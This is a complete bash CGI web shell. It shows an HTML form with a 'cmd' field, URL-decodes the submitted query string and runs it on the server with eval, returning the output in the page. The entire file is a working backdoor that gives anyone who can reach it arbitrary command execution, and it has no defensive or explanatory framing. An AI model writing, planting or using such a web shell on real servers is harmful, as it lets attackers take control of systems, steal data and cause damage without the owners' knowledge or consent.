#!/bin/bash

echo -e 'Content-Type: text/html\n'

echo '<h1></h1>'
echo '<form action="" method="GET">'
echo '<input type="text" name="cmd" autofocus />'
echo '<input type="submit" />'
echo '</form>'

echo -e '\n<pre>\n'
cmd=${QUERY_STRING#'cmd='}
cmd=$(echo ${cmd}| python -c 'import sys;import urllib;sys.stdout.write(urllib.unquote_plus(sys.stdin.read()))')
echo ${cmd}
echo '<hr />'
eval ${cmd} 2>&1
echo -e '\n</pre>\n'
